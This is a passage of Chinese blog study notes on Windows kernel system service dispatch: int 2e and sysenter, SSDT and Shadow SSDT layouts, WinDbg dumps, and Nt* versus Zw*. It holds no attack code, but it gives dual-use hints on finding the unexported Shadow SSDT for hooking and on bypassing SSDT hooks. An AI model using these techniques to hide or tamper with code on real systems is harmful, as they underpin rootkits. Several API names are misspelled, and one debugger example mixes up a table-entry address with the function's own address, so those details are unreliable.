<li><strong>用户模式下</strong>：如果该线程在用户模式下执行，那么 Windows 就<strong>切换到该线程的内核模式栈</strong>。然后，Windows 在被中断线程的内核栈上创建一个陷阱栈帧（trap frame），并且把线程的执行状态保存到陷阱帧里。陷阱帧是一个线程的完整执行环境的一个子集，在内核调试器中输入<code>dtnt!_trap_frame</code>就可以看到陷阱帧的定义。（<strong>即从用户模式切换到内核模式，同时栈帧也从用户模式切换到内核模式</strong>）。</li>
</ul>
</li>
<li><p>（软中断，即异常）</p>
<p>内核在处理软中断时，或者将软中断当作硬中断处理的一部分，或者当线程调用与软中断相关的内核函数时以同步方式（即异常）进行处理。</p>
</li>
</ol>
</div>

<p><strong>陷阱分发：</strong></p>
<p>在大多数情况下，内核安装了前端陷阱处理函数（陷阱分发处理器），在内核将控制权转交给与特定陷阱相关的处理函数之前或者之后，由这些前端陷阱处理函数来执行一些常规的陷阱处理任务（陷阱分发）。例如：</p>
<ul>
<li>如果陷阱条件是一个设备中断，则内核的硬件中断陷阱处理器（函数）将控制权转交给一个由设备驱动程序提供给该中断设备的中断服务例程（ISR，interrupt service routine）。</li>
<li>如果陷阱条件是因为调用一个<strong>系统服务而引发</strong>的，那么，通用的系统服务陷阱处理器将控制权转交给<strong>执行体中指定的系统服务函数</strong>（系统服务分发器）。</li>
<li>内核也会为它不希望看到的或者根本不处理的陷阱安装陷阱处理器。这些陷阱处理器一般的做法是执行系统函数<code>KebugCheckEx</code>，当内核检测到可能导致数据破坏的有问题行为或者不正确行为时，该函数会停止计算机</li>
</ul>
<h4 id="2-3-6-系统服务分发"><a href="#2-3-6-系统服务分发" class="headerlink" title="2.3.6 系统服务分发"></a>2.3.6 系统服务分发</h4><p><img data-src="https://img.shields.io/badge/%E3%80%8A%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC6%E7%89%88%E3%80%8B-3.1%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%88%86%E5%8F%91-1fd0f6.svg?colorA=ff69b4"></p>
<p><img data-src="https://img.shields.io/badge/%E3%80%8AWindows%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B-8.1.3Windows%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%88%86%E5%8F%91-1fd0f6.svg?colorA=ff69b4"></p>
<p><strong>系统服务分发</strong>（System Service Dispatching）：内核中接收到合法的应用程序（用户模式的ntdll）调用时，根据<code>ntdll.dll    </code>中的系统服务存根函数指定的<mark class="label danger">系统服务号</mark>，在内核模式下，<code>KiSystemServiceRepeat</code>根据此系统服务号，知道该调用内核中哪个系统服务例程，以及从用户栈拷贝多少数据到内核栈中，然后执行该系统服务。</p>
<ul>
<li>接收系统服务号的是<mark class="label danger">系统服务分发器</mark>，然后根据系统服务号决定系统去执行哪一个系统服务。</li>
</ul>
<div class="note warning"><p>处理器一旦被中断，就会询问中断控制器以获得此中断请求（IRQ， Interrupt request）。中断控制器将该 IRQ 转译成一个<mark class="label info">中断号</mark>，利用该编号作为索引，在一个称为<strong>中断分发表</strong>（<mark class="label info">IDT</mark>，Interrupt dispatch table）的结构中找到一个IDT项，并且将控制权传递给恰当的中断分发器（例程）。在系统引导的时候，Windows会填充IDT，其中包含了指向负责处理每个中断和异常的内核器（例程）的指针。</p>
<p>Windows将硬件IRQ映射至IDT中的中断号上，同时利用IDT来为异常配置陷阱处理器，然后进行陷阱分发。</p>
</div>

<div class="note primary"><p><strong>硬中断和异常都会产生中断号，直接对应于IDT中的表项。</strong></p>
<p>在x86和x64处理器上，所有的异常（包括系统服务调用）都有预定义的中断号，直接对应于IDT中的表项，而每个表项又指向某个特定异常的陷阱处理器。表3.6显示了x86定义的异常，以及为它们分配的中断号。因为IDT中前面的表项是用于异常的，所以，硬件中断被分配了后面的表项。</p>
</div>

<p><img data-src="https://i.loli.net/2021/05/30/ics6bmURWLJSwuq.png" alt="14.png"></p>
<p><img data-src="https://i.loli.net/2021/05/30/Nik2KQ1GEl7JeUt.png" alt="15.png"></p>
<p><strong>系统服务分发：</strong></p>
<div class="note danger"><p><strong>系统服务分发顺序：</strong></p>
<p>$$中断号45 –&gt; 查IDT表第46项 –&gt; 系统服务分发器 –&gt; 从EAX获取系统服务号 –&gt; 查SDT –&gt; 得到XXX系统服务。$$</p>
<p>CPU从用户模式切换到内核模式，需要一个进行一个陷阱处理，能触发陷阱的是ntdll.dll中的<code>int 2E</code>和<code>sysenter</code>两个指令，产生一个中断号45。Windows填充IDT的46号表项，使其指向系统服务分发器。</p>
</div>

<h5 id="部分1：int-0x2E-和-Sysenter"><a href="#部分1：int-0x2E-和-Sysenter" class="headerlink" title="部分1：int 0x2E 和 Sysenter"></a>部分1：int 0x2E 和 Sysenter</h5><mark class="label info">int 0x2e</mark><mark class="label warning">sysenter</mark>

<ul>
<li><p>在Pentium I之前的x86处理器上，Windows使用<mark class="label info">int 0x2e</mark>指令（十进制是46），它会导致一个陷阱。</p>
<ul>
<li>该陷阱导致执行线程转换到内核模式中，并且进入系统服务分发器。</li>
<li>在处理器的<mark class="label default">EAX</mark>寄存器中传递的数值参数指明了所请求的<mark class="label default">系统服务号</mark>，<mark class="label primary">由ntdll.dll的存根函数指定服务号</mark>。</li>
<li><mark class="label default">EDX</mark>寄存器指向调用者传递给该系统服务的参数列表<mark class="label default">地址</mark>。</li>
<li>要回到用户模式，系统服务分发器需要使用<code>iret</code>指令（即中断返回指令）。</li>
</ul>
</li>
<li><p>在x86 Pentium II 及更高级的处理器上，Windows使用专门的<mark class="label warning">sysenter</mark>指令（32位使用sysenter指令，x64使用syscall指令，IA64使用epc指令。），这是InteI特别为<strong>快速系统服务分发</strong>而定义的指令。</p>
<ul>
<li>为了支持这一指令， Windows在引导时将内核的系统服务分发器例程的地址保存在与该指令相关联的3个<mark class="label default">MSR</mark>（machine specific register）寄存器中。</li>
<li>该指令一旦被执行，就会导致变换到内核模式下，并且执行系统服务分发器。</li>
<li>系统服务号是通过处理器的EAX寄存器来传递的，而EDX寄存器则指向调用者参数的列表地址。</li>
<li>为了返回到用户模式，系统服务分发器通常执行<code>sysexit</code>指令。</li>
</ul>
</li>
</ul>
<div class="note warning"><p>ntdll.dll中的<code>KiIntSystemCall</code>函数执行<code>int 2e</code>，<code>KiFastSystemCall</code>执行<code>sysenter</code>指令，以便切换到内核模式下，然后由内核模式的系统服务分发函数<code>KiSystemService</code>或<code>KiFastCallEntry</code>（系统服务分发器）来调用系统服务函数。待系统服务函数执行完成以后，<code>KiSystemService </code>调用<code>KiServiceExit</code>函数，最终通过<code>iretd</code>或<code>sysexit</code>指令返回到用户模式ntdll.dll模块中。</p>
<ul>
<li>用户模式下：<ul>
<li><code>SystemCall</code> --&gt; <code>KiIntSystemCall</code> --&gt; <code>int 2e</code>；</li>
<li><code>SystemCall</code>  --&gt; <code>KiFastSystemCall</code>--&gt; <code>sysenter</code>。</li>
</ul>
</li>
<li>内核模式下：<ul>
<li><code>KiIntSystemCall</code> --&gt; <code>int 2e</code> --&gt; <code>KiSystemService</code> --&gt; 系统服务函数 --&gt; <code>KiServiceExit</code> --&gt; <code>iretd</code> --&gt; 返回用户模式；</li>
<li><code>KiFastSystemCall</code>--&gt; <code>sysenter</code> --&gt; <code>KiFastCallEntry</code> --&gt; 系统服务函数 --&gt; <code>KiServiceExit2</code> --&gt; <code>sysexit</code> --&gt; 返回用户模式。</li>
</ul>
</li>
</ul>
<p><code>SystemCall</code>和<code>SystemCallReturm</code>成员：</p>
<ul>
<li>这是两个<mark class="label default">函数地址</mark>，<code>SystemCall</code>成员指示了从用户模式切换至内核模式的函数地址；<code>SystemCallReturn</code>成员指示了从内核模式返回至用户模式的函数地址。</li>
<li>当处理器支持快速系统调用时，SystemCall成员指向<code>KiFastSystemCall</code>函数，<code>SystemCallReturn</code>成员指向<code>KiFastSystemCallRet</code>函数；否则，<code>SystemCall</code>成员指向<code>KiIntSystemCall</code>函数。</li>
</ul>
</div>

<p>在切换至内核模式以前，edx寄存器指向用户栈中的某个位置。显然，edx的用意是向内核模式的系统服务函数传递有关参数的信息。内核中哪个函数被执行呢（<mark class="label primary">指定哪个系统分发器</mark>）？</p>
<ul>
<li>如果是由<code>int 2e</code>指令进入的，则<code>KiSystemService</code>（<mark class="label default">系统服务分发器</mark>）函数获得控制权，这是在IDT的<code>0x2e</code>项中指定的；</li>
<li>如果是借由<code>syenter</code>指令跳转过来的，则<code>KiFastCallEntry</code>（<mark class="label default">系统服务分发器</mark>）函数获得控制权，这是由MSR寄存器<code>IA32_SYSENTER_EIP</code>指定的。</li>
</ul>
<h5 id="部分2：原先模式"><a href="#部分2：原先模式" class="headerlink" title="部分2：原先模式"></a>部分2：原先模式</h5><p>系统服务分发器将调用者的参数从线程的用户模式栈中复制到内核模式找中（所以，当内核在访问参数时，用户不能改变它们），然后执行该系统服务。内核知道要从栈中复制多少字节，因为它使用了第二个表， 称为参数表<mark class="label default">SSPT</mark>。参数表是一个<mark class="label warning">字节数组</mark>（而并非像服务分发表那样是一个<mark class="label warning">指针数组</mark>），每一项描述了要复制的字节数。在64位系统上，Windows通过一个称为<strong>系统调用表缩紧</strong>（system call table compaction）的过程，将这一信息实际编码在服务表内部。如果传递给一个系统服务的参数指向了用户空间中的缓冲区，那么，内核模式的代码在复制数据到这些缓冲区中，或者从缓冲区中复制数据以前，必须要先探查这些缓冲区是否是可以访问的。只有当线程的原先模式（previous mode）属性被设置为用户模式，才会执行缓冲区探查工作。</p>
<mark class="label warning">原先模式</mark>：是内核在执行陷阱处理器时保存在线程中的一个值（内核或用户），<mark class="label info">代表了这一进来的异常、陷阱或系统调用是从哪个特权级别（R3/R0）进来的</mark>。作为一项优化措施：

<ul>
<li>如果一个系统调用来自于<strong>驱动程序</strong>或<strong>内核本身</strong>，则对参数的探查和异常捕获可以忽略，所有的参数都假定指向有效的内核模式缓冲区(而且，访问内核模式数据也是允许的)。调用者已经在内核模式下了，不需要<code>中断</code>或<code>sysenter</code>操作CPU已经在正确的特权级上了，而且，驱动程序和内核一样， 应该只能直接调用所请求的函数。<ul>
<li>但如果直接像调用API一般直接调用<code>NtOpenProcess</code>之类的系统服务函数时，内核保存的原先模式值仍然是用户模式（进内核之前当然是用户模式咯~），但又检测到传递来的地址是一个内核模式地址（因为在当前内核模式下调用），于是会导致调用失败（<code>STATUS_ACCESS_VIOLATION</code>）。</li>
</ul>
</li>
<li>如果原先模式为用户模式，在给系统服务传递的参数指向了用户空间缓冲区时，内核模式代码在操作该缓冲区前会检查是否可以访问该缓冲区。</li>
</ul>
<h5 id="部分3：SSDT-和-Shadow-SSDT"><a href="#部分3：SSDT-和-Shadow-SSDT" class="headerlink" title="部分3：SSDT 和 Shadow SSDT"></a>部分3：SSDT 和 Shadow SSDT</h5><p>ntdll.dll中的系统服务存根函数调用<code>int 2e</code>或<code>sysenter</code>产生中断（<mark class="label danger">中断号</mark>），同时存根函数指定一个<mark class="label primary">系统服务号</mark>。一个存根函数对应一个系统服务号。 </p>
<div class="note info"><p>系统服务分发过程中有两个重要的系统服务分发表，在 NT 4.0 以上的 Windows 操作系统中（Windows 2000），默认就存在两个系统服务描述表，这两个调度表对应了两类不同的系统服务，这两个调度表为：</p>
<ul>
<li><p><mark class="label danger">SSDT：</mark><mark class="label success">KeServiceDescriptorTable</mark></p>
</li>
<li><p><mark class="label danger">ShadowSSDT：</mark><mark class="label success">KeServiceDescriptorTableShadow</mark></p>
</li>
</ul>
<ol>
<li><code>KeServiceDeseriptorTable</code>定义了<code>Ntoskrnl.exe</code>中实现的核心执行体系统服务。<code>KeSericeDescriptorTableShadow</code>包含了在Windows子系统的内核模式部分<code>Win32k.sys</code>中实现的Windows USER和GDI服务。</li>
<li>针对Windows执行体服务的系统服务分发指令位于系统库ntdll.dll中。子系统DLL调用 Ntdll.dll中的函数来实现其已文档化的函数。只有Windows USER和GDI函数例外，在这些函数中，系统服务分发指令是直接在User32.dII和Gdi32.dll中实现的，没有涉及Ntdll.dll。</li>
<li>在32位和IA64版本的Windows 上，当Windows线程第一次调用Windows USER或GDI服务时，该线程的系统服务表的地址被改变成指向个包含Windows USER和GDI服务的表。KeaddSystemerviceTable 函数使Win32k.sys可以增加一个系统服务表。</li>
<li>win32k.sys只有在GUI线程中才加载，一般情况下是不加载的，所以要Hook KeServieDescriptorTableShadow的话，一般是用一个GUI程序通过IoControlCode来触发。</li>
</ol>
</div>

<p>Windows 操作系统共有4个系统服务描述符。其中只用了两个，第一个是SSDT，第二个是ShadowSSDT。SSDT与ShadowSSDT的结构如下(参考《Undocument Windows 2000 Secretes》第二章)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// KSYSTEM_SERVICE_TABLE 和 KSERVICE_TABLE_DESCRIPTOR</span></span><br><span class="line"><span class="comment">// 用来定义 SSDT 结构</span></span><br><span class="line"><span class="comment">/********</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">  KeServiceDeseriptorTable结构</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">*********/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG  *ServiceTableBase;                         <span class="comment">// SSDT (System Service Dispatch Table)的基地址</span></span><br><span class="line">    PULONG  *ServiceCounterTableBase;                  <span class="comment">// 用于 checked builds, 包含 SSDT 中每个服务被调用的次数</span></span><br><span class="line">    ULONG   NumberOfService;                           <span class="comment">// SSDT服务函数的个数, NumberOfService * 4 就是整个地址表的大小</span></span><br><span class="line">    ULONG   * ParamTableBase;                          <span class="comment">// SSPT(System Service Parameter Table)的基地址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"><span class="comment">/********</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">  KeServiceDeseriptorTableShadow结构</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">*********/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   ntoskrnl;                  <span class="comment">// ntoskrnl.exe 的服务函数</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   win32k;                    <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure>



<div class="note danger"><p><strong>说明：</strong></p>
<ol>
<li><p><code>KeServiceDescriptorTable</code>由ntoskrnl.exe导出和<code>KeServiceDescriptorTableShadow</code>没有导出，二者都<mark class="label default">是数组</mark>；</p>
<ul>
<li><p>系统使用的基本 SSDT，即<code>KeServiceDescriptorTable[0]</code>，<code>KeServiceDescriptorTable[1]</code>元素不使用。是在<code>KiInitsystem</code>函数中被初始化的，此 SSDT 的原始数据分别来自于内部变量<code>KiserviceTable</code>、<code>KiserviceLimit</code>和 <code>Kiargumenttable</code>，其中<code>Count</code>成员被初始化为<code>NULL</code>，参见下图。</p>
</li>
<li><p><code>KeServiceDescriptorTableShadow</code>是一个内部数组，<strong>它的第 2 个元素为ShadowSSDT</strong>，即  <code>KeServiceDescriptorTableShadow[1]</code>表项，专门用于 Windows 子系统，其他的表项与  <code>KeServiceDescriptorTable</code>完全相同。<code>KeServiceDescriptorTable[0]</code>为SSDT，<strong>但是不使用</strong>。</p>
<p><img data-src="https://i.loli.net/2021/06/08/lyvI9ojW78bs6wi.png" alt="16.png"></p>
</li>
</ul>
</li>
<li><p>SSDT、SSPT表都属于<code>KeServiceDescriptorTable</code>结构的<mark class="label default">第一和第四个元素</mark>。Shadow SSDT属于<code>KeServiceDescriptorTableShadow</code>结构的<mark class="label default">第二个元素</mark>。<strong>SSDT的函数是Native API</strong>。</p>
</li>
<li><p>SSDT是<code>KeServiceDescriptorTable</code>的第一个元素<code>ServiceTableBase</code>，且为一个数组或指针，指向ntoskrnl.dll中系统函数的<mark class="label default">入口地址</mark>。</p>
<ul>
<li><p>某个系统服务函数的地址的计算方法为：</p>
<p>$$Address &#x3D; KeServiceDescriptorTable.ServiceTableBase + 4 * 系统服务号$$</p>
</li>
</ul>
</li>
<li><p><code>KeServiceDescriptorTableShadow</code>包含4个子结构，其中第一个就是ntoskrnl.exe ( native api )，不用，我们真正需要获得的是第二个win32k.sys (gdi&#x2F;user support)，第三个和第四个一般不使用。</p>
</li>
<li><p>两者的区别是，<code>KeServiceDescriptorTable</code>仅有ntoskrnel一项，<code>KeServieDescriptorTableShadow</code>包含了ntoskrnel以及win32k。一般的Native API的服务地址由<code>KeServiceDescriptorTable</code>分派，<code>gdi.dll/user.dll</code>的内核API调用服务地址由<code>KeServieDescriptorTableShadow</code>分派。</p>
</li>
<li><p>SSDT中系统服务函数的个数随着Windows发展在不断增加，且不同版本中的系统服务函数对应的系统服务号一般不同。</p>
</li>
</ol>
</div>

<p><strong>1）</strong>对照KeServiceDescriptorTable结构，Windbg查看其结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lkd&gt; dd KeServiceDescriptorTable   </span><br><span class="line"><span class="number">80563520</span>  <span class="number">804e58</span>b0 <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805120</span>cc  <span class="comment">//804e58b0就是SSDT表的起始地址，805120cc为SSPT表的起始地址</span></span><br><span class="line"><span class="number">80563530</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="comment">//KeServiceDescriptorTableShadow未公开</span></span><br><span class="line"><span class="number">80563540</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80563550</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> </span><br><span class="line">...</span><br><span class="line">lkd&gt; dd <span class="number">804e58</span>b0               <span class="comment">//SSDT基址</span></span><br><span class="line"><span class="number">804e58</span>b0  <span class="number">80591b</span>fb <span class="number">80585358</span> <span class="number">805e1</span>f35 <span class="number">805</span>dbc4a</span><br><span class="line"><span class="number">804e58</span>c0  <span class="number">805e1</span>fbc <span class="number">80640</span>ce4 <span class="number">80642e75</span> <span class="number">80642</span>ebe</span><br><span class="line"><span class="number">804e58</span>d0  <span class="number">805835</span>aa <span class="number">80650b</span>e3 <span class="number">806404</span>a3 <span class="number">805e1787</span></span><br><span class="line"><span class="number">804e58</span>e0  <span class="number">806387b</span>a <span class="number">80586f</span>a3 <span class="number">805e08</span>e8 <span class="number">8062f</span>462</span><br><span class="line">...</span><br><span class="line">若sysenter的ID（系统服务号）是<span class="number">0x105</span>，对应函数ntos!NtQuerySystemInformation=<span class="number">0x804e58b0</span>+<span class="number">4</span>*<span class="number">0x105</span>=<span class="number">0x804e5cc4</span>，</span><br><span class="line">  跟踪进去：</span><br><span class="line">lkd&gt; u <span class="number">804e5</span>cc4</span><br><span class="line">nt!NtQuerySystemInformation:</span><br><span class="line"><span class="number">8464</span>ae3e  <span class="number">8b</span>ff          mov     edi,edi</span><br><span class="line"><span class="number">8464</span>ae40  <span class="number">55</span>            push    ebp</span><br><span class="line"><span class="number">8464</span>ae41  <span class="number">8b</span>ec          mov     ebp,esp</span><br><span class="line"><span class="number">8464</span>ae43  <span class="number">8b</span>5508        mov     edx,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">8464</span>ae46  <span class="number">83f</span>a53        cmp     edx,<span class="number">53</span>h</span><br><span class="line"><span class="number">8464</span>ae49  <span class="number">7f</span>21          jg      nt!NtQuerySystemInformation+<span class="number">0x2e</span> (<span class="number">8464</span>ae6c)</span><br><span class="line"><span class="number">8464</span>ae4b  <span class="number">7440</span>          je      nt!NtQuerySystemInformation+<span class="number">0x4f</span> (<span class="number">8464</span>ae8d)</span><br><span class="line"><span class="number">8464</span>ae4d  <span class="number">83f</span>a08        cmp     edx,<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><strong>2）</strong>对照KeServiceDescriptorTableShadow结构，Windbg查看其结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTableShadow  </span><br><span class="line"><span class="number">805634e0</span>  <span class="number">804e58</span>b0 <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805120</span>cc    KeServiceDescriptorTableShadow[<span class="number">0</span>]，SSDT表 Ntoskrnel.exe，不用</span><br><span class="line"><span class="number">805634f</span>0  bf99a000 <span class="number">00000000</span> <span class="number">0000029b</span> bf99ad10    KeServiceDescriptorTableShadow[<span class="number">1</span>]，SSDT Shdow表 Win32k.sys</span><br><span class="line"><span class="number">80563500</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80563510</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80563520</span>  <span class="number">804e58</span>b0 <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805120</span>cc       <span class="comment">//KeServiceDescriptorTable 表</span></span><br><span class="line"><span class="number">80563530</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>同时还发现，在XP系统下，KeServiceDescriptorTableShadow表位于KeServiceDescriptorTable表下方，偏移0x40处。</p>
<div class="note primary"><p>结论：</p>
<p>ShadowSSDT在<mark class="label info">KeServiceDescriptorTableShadow[1]</mark>中第二个元素，而<mark class="label warning">KeServiceDescriptorTableShadow[0]</mark>第一个元素为SSDT。</p>
</div>

<p><img data-src="https://i.loli.net/2021/06/10/H4BRSyMsYwj5kDT.png" alt="17.png"></p>
<p><img data-src="https://i.loli.net/2021/06/10/kV1ChfTWUFxD6ba.jpg" alt="21.jpeg"></p>
<p>参考：</p>
<ul>
<li>《<a href="https://blog.csdn.net/xuemao1230/article/details/79397553">ssdt与shadowssdt区别</a>》</li>
<li>《<a href="https://cataloc.gitee.io/blog/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/#SharedCode%E5%88%86%E6%9E%90">API函数的调用过程（系统服务表）</a>》</li>
<li>《<a href="https://www.cnblogs.com/onetrainee/p/11717309.html">Windows系统调用中的系统服务表描述符(SSDT)</a>》</li>
</ul>
<div class="note default"><p>由于KeServiceDescriptorTableShadow表属于未导出，因此我们需要定位地址。<br>定位未导出函数和结构的思想就是利用已导出函数和结构，暴力搜索内存空间。<br>方法一、依据KeServiceDescriptorTable的地址和两者之间的偏移<br>方法二、搜索KeAddSystemServiceTable导出函数<br>方法三、搜索线程的ServiceTable指向<br>方法四、MJ提出的搜索有效内存地址</p>
</div>

<h5 id="部分4：系统服务号"><a href="#部分4：系统服务号" class="headerlink" title="部分4：系统服务号"></a>部分4：系统服务号</h5><p>系统服务号用来定位所要寻找的系统服务表的函数。</p>
<div class="note warning"><p><mark class="label info">系统服务号只有低13位是有用的</mark></p>
<ul>
<li>下标12：判断去查服务表，<mark class="label warning">0</mark>去查第一张表SSDT；<mark class="label warning">1</mark>去查第二张表ShadowSSDT</li>
<li>下标0~11：表内索引，函数地址表的索引，范围0H ~ FFFH。<ul>
<li>SSDT函数服务号范围0x00000000 ~ 0x00000FFF；</li>
<li>ShadowSSDT服务号范围0x00001000 ~ 0x00001FFF。</li>
</ul>
</li>
</ul>
</div>

<p><img data-src="https://i.loli.net/2021/06/10/fdNwZQIkgmGvE9L.png" alt="18.png"></p>
<p><img data-src="https://i.loli.net/2021/06/10/lTrgJzkQYm9ia7E.png" alt="19.png"></p>
<h5 id="部分5：系统服务分发"><a href="#部分5：系统服务分发" class="headerlink" title="部分5：系统服务分发"></a>部分5：系统服务分发</h5><p>以函数WriteFile函数为例，从R3到R0的调用过程：</p>
<ol>
<li>如图3.17所示，位于Kernel32.dll中的Windows WriteFile函数导入并调用<code>API-MS-Win-Core-File-L1-1-0.dll</code>中的NtWriteFile函数，这是一个MinWin重定向DLL；</li>
<li>这里的NtWriteFile函数又调用<code>KernelBase.dll</code>中的WriteFile函数，这才是真正的实现所在。</li>
<li>KernelBase.dll.WriteFile函数对子系统相关的参数做了检查以后，再调用<code>Ndll.dll</code>中的<code>NtWriteFile</code>函数，然后NtWriteFile函数又执行适当的指令以引发一个系统服务陷阱并且把代表<code>NtWriteFile</code>的系统服务号传递过去。</li>
<li>系统服务分发器（即Ntoskml.exe中的<code>KiSystemService</code>函数）然后调用真正的<code>nt!NtWriteFile</code>来处理该IO请求。</li>
<li>对于Windows USER和GDI函数，系统服务分发器调用Windows子系统的可加载内核模式部分（Win32k.sys）中的函数。</li>
</ol>
<div class="note danger"><p>总结为：</p>
<p><code>Kernel32.dll.WriteFile --&gt; API-MS-Win-Core-File-L1-1-0.dll.NtWriteFile --&gt; KernelBase.dll.WriteFile --&gt;  Ndll.dll.NtWriteFile --&gt; KiFastSystemCall --&gt; sysenter --&gt; KiFastCallEntry（系统服务分发器） --&gt; 查找SSDT</code></p>
<p><img data-src="https://i.loli.net/2021/06/10/rW9boQ1YBU3cmOj.png" alt="20.png"></p>
</div>

<p>过程如下：</p>
<p><img data-src="https://i.loli.net/2021/06/11/L7easlOwjvA3EZ5.png" alt="22.png"></p>
<p>上图参考《<a href="https://wenku.baidu.com/view/5e4e0bda69dc5022abea001b.html?fr=search-1-wk_es_paddle-income5&fixfr=kZolUMQwRLbkNUCGioehqw==">SSDT 及SSDT Shadow 完全解析</a>》（可下载）</p>
<ul>
<li>《<a href="https://www.cnblogs.com/uAreKongqi/p/6597701.html">浅谈系统服务分发</a>》</li>
<li>《<a href="https://blog.csdn.net/cdsntxz158/article/details/8020629">SSDT获取原始服务地址的方法与原理</a>》</li>
<li>《<a href="https://zhuanlan.zhihu.com/p/38339756">Hook原理</a>》</li>
<li>《<a href="https://cloud.tencent.com/developer/article/1471088?from=article.detail.1471284">SSDT表概念详解</a>》</li>
<li>《<a href="https://zhuanlan.zhihu.com/p/328757029">SSDT Hook底层原理介绍以及如何实现进程保护</a>》</li>
</ul>
<h5 id="部分6：Nt-和-Zw"><a href="#部分6：Nt-和-Zw" class="headerlink" title="部分6：Nt* 和 Zw*"></a>部分6：Nt* 和 Zw*</h5><p><img data-src="https://i.loli.net/2021/06/15/LxrowB1pqlZjE3g.png" alt="24-1"></p>
<p><img data-src="https://i.loli.net/2021/06/11/6zHG54kqN7icYLj.png" alt="23.png"></p>
<div class="note info"><p><strong>nt!Zw*函数是nt!Nt*的一个stub(存根)函数</strong>，只是mov系统调用号到eax中，转而直接调用nt!KiSystemService去从SSDT中找到相应号码的函数再调用之，真正的实现都在Nt*函数中。</p>
</div>

<ul>
<li><code>ntdll!Zw*</code>仅仅是<code>ntdll!*</code>函数的别名而已</li>
<li>内核模式下Nt系列API将直接调用对应的函数代码，而Zw系列API则通过KiSystemService，SSDT最终跳转到对应的NT函数代码。</li>
<li>两种不同的调用对内核中previous mode（原先模式）的改变，如果是从用户模式调用Native API则previous mode是用户态，如果从内核模式调用Native API则previous mode是内核态。previous为用户态时Native API将对传递的<strong>参数进行严格的检查</strong>，而为内核态时则不会。</li>
<li>调用用户模式Nt API时不会改变previous mode的状态，调用内核模式Zw API时会将previous mode改为内核态，因此在进行Kernel Mode Driver开发时可以使用内核模式Zw系列API可以避免额外的参数列表检查，提高效率。</li>
<li>内核模式下Zw*函数会把PreviousMode设置为KernelMode  然后再调用Nt*函数，因此在Nt*函数中就不会进行参数检查。而如果直接调用Nt*函数的话 , 必须自己将PreviousMode设置为KernelMode，否则PreviousMode很可能仍然是UserMode，这样的话Nt*函数就会认为对它的调用来自用户态，从而做一些检查,这时就会产生问题了。因此要自己调用Nt*的话必须先将PreviousMode设为KernelMode。</li>
<li>R3下无论如何调用，均无法绕过SSDT HOOK，R0下若在驱动中直接调用Nt系列函数，调用Nt*可以绕过SSDT HOOK。</li>
</ul>
<p>参考：</p>
<ul>
<li>《<a href="https://blog.csdn.net/qiaoli278141408/article/details/39502285?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">Nt*和Zw*开头的函数</a>》</li>
<li>《<a href="https://blog.csdn.net/zhuhuibeishadiao/article/details/51114094">ZW与NT函数区别</a>》</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP 深入理解计算机系统读书笔记</title>
    <url>/post/cssapp_notes-1-2-3/</url>
